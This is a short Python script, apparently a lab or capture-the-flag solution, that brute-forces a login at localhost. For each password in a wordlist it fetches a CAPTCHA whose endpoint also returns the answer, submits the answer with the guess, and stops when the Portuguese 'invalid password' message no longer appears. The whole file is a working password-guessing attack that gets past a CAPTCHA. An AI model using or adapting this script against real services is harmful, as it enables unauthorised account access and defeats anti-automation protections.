import requests
import json
import sys
import time

def send_captcha_request():
    response = requests.get("http://localhost:8080/captcha")
    data = response.json()
    return data['captcha_id'], data['captcha_solution']

def authenticate(username, password, captcha_id, captcha_solution):
    url = "http://localhost:8080/authenticate"
    payload = {
        "captcha_id": captcha_id,
        "captcha_solution": captcha_solution,
        "username": username,
        "password": password
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    return response.text

def main(passwords_file):
    with open(passwords_file, 'r') as file:
        passwords = file.readlines()
    
    total_passwords = len(passwords)
    for index, password in enumerate(passwords):
        password = password.strip()
        captcha_id, captcha_solution = send_captcha_request()
        
        auth_response = authenticate("INSERT_HERE_AFTER_FIND", password, captcha_id, captcha_solution)
        
        # Print status in the same line
        print(f"Testing password {index + 1}/{total_passwords}: {password}", end='\r')
        
        if "Senha inválida!" not in auth_response:
            print(f"\nSuccessful authentication for password: {password}")
            print(f"Authentication response: {auth_response}")
            break
        
        time.sleep(0.1)  # Small delay to ensure the print happens correctly
    
    print("\nFinished testing all passwords.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <arquivo_de_passwords.txt>")
        sys.exit(1)
    
    passwords_file = sys.argv[1]
    main(passwords_file)
